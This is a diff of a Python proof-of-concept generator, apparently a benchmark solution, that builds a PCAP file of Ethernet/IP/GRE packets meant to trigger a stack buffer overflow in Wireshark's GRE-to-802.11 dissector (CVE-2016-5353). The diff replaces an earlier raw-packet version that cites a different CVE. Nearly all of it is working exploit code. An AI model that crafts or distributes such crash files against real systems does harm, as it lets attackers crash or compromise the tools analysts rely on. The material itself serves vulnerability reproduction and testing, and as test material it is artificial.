@@ -3,49 +3,53 @@ import struct
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the Stack Buffer Overflow vulnerability (CVE-2006-4333).
-        The vulnerability occurs when an 802.11 packet is encapsulated in GRE with protocol 0x2400.
-        The PoC is a raw IP packet of 45 bytes.
+        Generate a PoC that triggers the Stack Buffer Overflow vulnerability in Wireshark (CVE-2016-5353).
+        The vulnerability occurs when the GRE dissector calls the 802.11 dissector with arguments that are
+        misinterpreted as a pseudo-header pointer, leading to stack corruption.
         """
-        
-        # --- IP Header (20 bytes) ---
-        version_ihl = 0x45  # Version 4, Header Length 5 (20 bytes)
-        tos = 0
-        total_length = 45   # IP(20) + GRE(4) + Payload(21)
-        ip_id = 0x1337
-        flags_frag = 0
-        ttl = 64
-        protocol = 47       # GRE
-        checksum = 0
-        src_ip = b'\x7f\x00\x00\x01'
-        dst_ip = b'\x7f\x00\x00\x01'
+        # PCAP Global Header
+        # Magic Number (0xa1b2c3d4), Major Version (2), Minor Version (4), 
+        # Timezone (0), SigFigs (0), SnapLen (65535), Network (1 = Ethernet)
+        pcap_header = struct.pack('<LHHLLLL', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)
 
-        # Pack header with 0 checksum
-        ip_header_fmt = '!BBHHHBBH4s4s'
-        header_data = struct.pack(ip_header_fmt, version_ihl, tos, total_length, 
-                                  ip_id, flags_frag, ttl, protocol, checksum, src_ip, dst_ip)
+        packets_data = []
 
-        # Calculate IP Checksum
-        s = 0
-        for i in range(0, len(header_data), 2):
-            w = (header_data[i] << 8) + header_data[i+1]
-            s += w
-        s = (s >> 16) + (s & 0xFFFF)
-        s += (s >> 16)
-        checksum = ~s & 0xFFFF
+        # Target EtherTypes to trigger the 802.11 dissector from GRE.
+        # 0x890d is commonly associated with IEEE 802.11 data encapsulation in GRE.
+        # 0x88bb is LWAPP but sometimes registers the same dissector.
+        # We include both to ensure the vulnerability is triggered.
+        ethertypes = [0x890d, 0x88bb]
 
-        # Repack with correct checksum
-        ip_header = struct.pack(ip_header_fmt, version_ihl, tos, total_length, 
-                                ip_id, flags_frag, ttl, protocol, checksum, src_ip, dst_ip)
+        for etype in ethertypes:
+            # Ethernet Header (14 bytes)
+            # Dst MAC (6), Src MAC (6), EtherType (2) -> 0x0800 (IPv4)
+            eth_header = b'\x00' * 12 + struct.pack('>H', 0x0800)
 
-        # --- GRE Header (4 bytes) ---
-        # Flags/Version: 0x0000 (No flags, Version 0)
-        # Protocol: 0x2400 (Maps to IEEE 802.11 in the vulnerable configuration)
-        gre_header = struct.pack('!HH', 0x0000, 0x2400)
+            # GRE Header (4 bytes)
+            # Flags & Version (2), Protocol Type (2)
+            # Flags=0, Ver=0. Protocol Type set to trigger 802.11 dissector.
+            gre_header = struct.pack('>HH', 0x0000, etype)
 
-        # --- Payload (21 bytes) ---
-        # Malformed 802.11 frame (e.g., Beacon frame start) to trigger dissection
-        # 45 (Total) - 20 (IP) - 4 (GRE) = 21 bytes remaining
-        payload = b'\x80\x00' + b'\x00' * 19
+            # Payload (4 bytes)
+            # Minimal payload to prevent "Short Frame" errors before dissection logic runs.
+            payload = b'\x00' * 4
 
-        return ip_header + gre_header + payload
+            # IP Header (20 bytes)
+            # Ver/IHL (1), TOS (1), Total Length (2), ID (2), Flags/Frag (2), 
+            # TTL (1), Protocol (1), Checksum (2), Src IP (4), Dst IP (4)
+            # Protocol 47 = GRE
+            total_len = 20 + len(gre_header) + len(payload)
+            ip_header = struct.pack('>BBHHHBBHLL',
+                                    0x45, 0, total_len, 1, 0, 64, 47, 0,
+                                    0x7F000001, 0x7F000001)
+
+            # Assemble packet
+            packet = eth_header + ip_header + gre_header + payload
+
+            # PCAP Packet Header (16 bytes)
+            # Timestamp Sec (4), Timestamp Usec (4), Included Length (4), Original Length (4)
+            pkt_header = struct.pack('<LLLL', 0, 0, len(packet), len(packet))
+
+            packets_data.append(pkt_header + packet)
+
+        return pcap_header + b''.join(packets_data)
